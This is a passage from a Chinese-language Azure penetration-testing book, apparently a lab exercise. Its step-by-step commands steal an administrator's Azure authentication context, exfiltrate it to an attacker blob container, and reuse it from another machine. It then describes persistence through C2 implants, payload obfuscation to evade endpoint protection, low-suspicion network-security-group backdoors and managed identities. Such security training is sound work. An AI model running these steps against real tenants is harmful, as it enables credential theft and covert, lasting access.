

![](img/4fa338e84e0a590967a142dd798ba4e2_311_0.png)

图 8.8 – 验证身份验证和访问

- 8. 在此阶段，我们可以假装自己是受害者管理员用户并保存当前上下文以供以后使用。我们（作为攻击者）随后会将此文件复制到我们的系统。或者，想象一下你是一个在该系统上拥有活动会话的攻击者，并且你想要保存当前上下文以便外泄到另一个系统。

使用以下命令保存当前身份验证上下文并验证上下文是否已保存：

```
Save-AzContext -Path azureprofile.json
```

```
Get-ChildItem azureprofile.json
```

以下是命令及其输出的屏幕截图：

![](img/4fa338e84e0a590967a142dd798ba4e2_311_1.png)

图 8.9 – 保存身份验证上下文

- 9. 使用以下命令压缩已保存的身份验证上下文：

```
7z a azureprofile.zip azureprofile.json
```

以下是命令及其输出的屏幕截图：

![](img/4fa338e84e0a590967a142dd798ba4e2_312_0.png)

图 8.10 – 从身份验证上下文创建压缩的 ZIP

- 10. **将压缩的身份验证上下文外泄**到之前由脚本创建的 blob 容器中，使用以下 HTTPie 命令。 将 `<blob_container_url>` 占位符替换为从脚本输出中复制的 **Exfiltration Storage Location** 值。 **确保在粘贴前没有换行符。** 你应该会收到 HTTP 201 响应：

```
http PUT "<blob_container_url>" "@azureprofile.zip" "x-ms-blob-type: BlockBlob"
```

以下是命令及其输出的屏幕截图：

![](img/4fa338e84e0a590967a142dd798ba4e2_312_1.png)

图 8.11 – 将提取的凭据上传到 Azure Blob Storage

前面的命令使用了 HTTPie 工具，我们在第 2 章《构建你自己的环境》中介绍了它。以下是相同命令的 PowerShell 等效命令：

```
Invoke-WebRequest -Method 'PUT' -Uri '<blob_container_url>' -InFile 'azureprofile.zip' -Headers @{"x-ms-blob-type"="BlockBlob"}
```

- 11. 通过在 Azure 门户中浏览来验证压缩的身份验证上下文现在是否存在于存储帐户中。存储帐户的命名格式为 pentestXXXX（XXXX 是由部署脚本生成的随机数字）：

![](img/4fa338e84e0a590967a142dd798ba4e2_313_0.png)

图 8.12 – 验证外泄的凭据

- 12. 在你的 pentest VM 中，打开一个 PowerShell 控制台并使用以下命令验证你当前是否没有连接到受害者的 Azure 环境。你应该会收到错误消息，如以下屏幕截图所示。

如果你已通过身份验证，请使用 `Disconnect-AzAccount` 注销：

```
Get-AzResourceGroup
```

以下是命令及其输出的屏幕截图：

![](img/4fa338e84e0a590967a142dd798ba4e2_314_0.png)

图 8.13 – 验证未经过身份验证的会话

- 13. 使用以下命令下载并验证外泄的上下文文件。 将 `<blob_container_url>` 占位符替换为从脚本输出中复制的 Exfiltration Storage Location 值：

```
Invoke-WebRequest -Uri "<blob_container_url>" -OutFile azureprofile.zip
```

```
Get-ChildItem azureprofile.zip
```

以下是命令及其输出的屏幕截图：

![](img/4fa338e84e0a590967a142dd798ba4e2_314_1.png)

图 8.14 – 下载提取的凭据

- 14. 使用以下命令提取下载的文件并验证提取的文件：

```
7z e azureprofile.zip
```

```
Get-ChildItem -Filter azureprofile.*
```

以下是第一个命令及其输出的屏幕截图：

![](img/4fa338e84e0a590967a142dd798ba4e2_315_0.png)

图 8.15 – 提取下载的压缩 ZIP

以下屏幕截图是第二个命令及其输出：

![](img/4fa338e84e0a590967a142dd798ba4e2_315_1.png)

图 8.16 – 查看提取的凭据

- 15. 使用以下命令将身份验证上下文恢复到你的 pentest VM：

```
Import-AzContext -Path ./azureprofile.json
```

以下是命令及其输出的屏幕截图：

![](img/4fa338e84e0a590967a142dd798ba4e2_316_0.png)

图 8.17 – 将上下文导入到当前会话

- 16. 通过运行使用被盗管理员身份验证上下文的命令来验证上下文是否已成功应用于你的 pentest VM。此时，你已验证身份验证上下文可以从管理员系统窃取、导出并从攻击者系统重用：

```
Get-AzResourceGroup
```

以下是命令及其输出的屏幕截图。如果收到错误消息，请尝试打开一个新的 PowerShell 窗口：

![](img/4fa338e84e0a590967a142dd798ba4e2_316_1.png)

图 8.18 – 使用外泄的凭据验证 Azure 访问

- 17. 现在我们已完成此练习，请返回 Azure Cloud Shell 并运行以下命令以下载清理脚本并验证下载：

```
Invoke-WebRequest -Uri http://bit.ly/admin-token-theft-scenario-cleanup -OutFile admin-token-theft-scenario-windows-cleanup.ps1
```

```
Get-ChildItem
```

至此，你已成功从管理员系统外泄 Azure 凭据并将其导入到你的系统。接下来，我们将介绍在单个 Azure 服务集合中保持持久性的可用选项。这些服务可以允许在多个层面上使用远程访问，并可以提供持久的资源和租户访问。

如果你创建任何新的资源来实现这种持久性，你应该使用现有的标签和资源命名结构来与现有资源融合。一般来说，最好坚持使用订阅中的现有服务来融合，但根据你的选项，你可能必须创建可能超出租户正常基础设施范围的新资源。

## 使用虚拟机保持持久性

首先，我们将研究如何利用 **虚拟机 (VM)** 来维持对 Azure 环境的访问。由于 VM 通常加入到更大的 Active Directory 域，因此它们可用于在 Azure 和 Active Directory 中保持持久性。

作为入门，我们将介绍使用 **命令与控制 (C2)** 植入物在 Azure VM 上开始持久性的情况。有许多商业和开源工具可用（Cobalt Strike、Covenant、PowerShell Empire 等），这些工具通常用于获取对系统的初始访问。我们可以在 Azure VM 上使用这些初始植入物可执行文件来开始在它们上的持久性工作。

> **重要说明**
>
> 请记住，许多 *现成* 的 C2 工具可能会被端点保护软件捕获。你可能需要在部署到 VM 之前采取额外的步骤来混淆你的有效负载。

这些植入物可以通过以下几种方式部署到 VM：

- 使用 VM `Run command` 功能
- 作为自定义脚本扩展
- 直接通过 RDP 访问系统
- 使用 DSC 配置（我们稍后会介绍）

一旦在这些系统上建立了初始部署和持久性，这些植入物将允许我们在系统上执行命令并维持对 VM 本身的访问。这使我们能够在主机上获得操作系统级别的访问，但并不保证域或 AAD 访问。

由于 C2 植入物的执行很大程度上取决于 VM，因此我们在本章中不会过多关注它。然而，由于我们正在讨论不同的持久性方法，这些方法可能允许在 VM 上执行命令，因此请将其作为一个选项记住。

### 打开管理端口

作为在虚拟机上使用 C2 植入物的替代方案，我们可以向我们的 IP 地址打开管理端口，以便使用我们已知的凭据远程访问 VM。正如我们之前提到的，有几种方法可以获取（或设置）VM 的本地管理员凭据，我们可以使用这些凭据远程管理系统。

这不是一个理想的解决方案，因为在渗透测试期间向互联网开放端口通常是不好的做法。此外，将端口打开到特定 IP 地址会将你的 IP 地址告知事件响应团队，这将使他们很容易将归因追溯到你的系统。此方法也可以扩展到 Azure PaaS 服务（Azure SQL 数据库、密钥保管库等），但这是一种特别嘈杂的维持访问方法，因此我们建议避免使用，除非你真的需要使用它。

另一个不太嘈杂的选项是在网络安全组中打开端口时指定 Azure 服务标签作为源。服务标签允许我们定义不太可疑的后门。例如，修改网络安全组以允许来自 AzureCloud 服务标签或 AzureCloud.UKSouth 服务标签的 RDP 或 SSH 流量可能对安全运营团队来说不太可疑，同时仍允许来自与指定源匹配的任何 Azure 节点的连接。

### 添加托管标识

通过向 VM 添加托管标识（系统分配或用户分配），我们可能能够为自己授予对租户中其他 Azure 资源的访问权限以实现持久性。这需要我们执行以下步骤：

- 1. 在 Azure 门户中导航到我们的目标 VM。
- 2. 为 VM 分配系统分配或用户分配的托管标识。
- 3. 在订阅/管理组和/或 Azure AD 级别为托管标识分配额外的权限。从渗透测试的角度来看，我们需要小心不要添加使环境容易受到更广泛攻击的权限。

